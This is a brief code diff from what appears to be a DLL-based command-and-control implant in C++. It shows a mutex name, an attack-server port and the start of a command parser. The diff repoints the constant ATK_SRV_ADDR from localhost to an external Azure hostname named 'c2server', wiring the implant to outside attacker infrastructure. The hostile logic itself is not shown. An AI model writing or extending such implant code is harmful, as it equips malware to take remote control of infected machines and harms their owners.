@@ -29,7 +29,7 @@
 const wchar_t* mutexName = L"DC2DLLMutex";
 const char inputParamsSeparator = ' ';
 const int ATK_SRV_PORT = 5000;
-const char* ATK_SRV_ADDR = "127.0.0.1";
+const char* ATK_SRV_ADDR = "c2server.francecentral.cloudapp.azure.com";
 
 std::vector<std::string> parseCommand(const std::string& input, char separator) {
     std::vector<std::string> result;
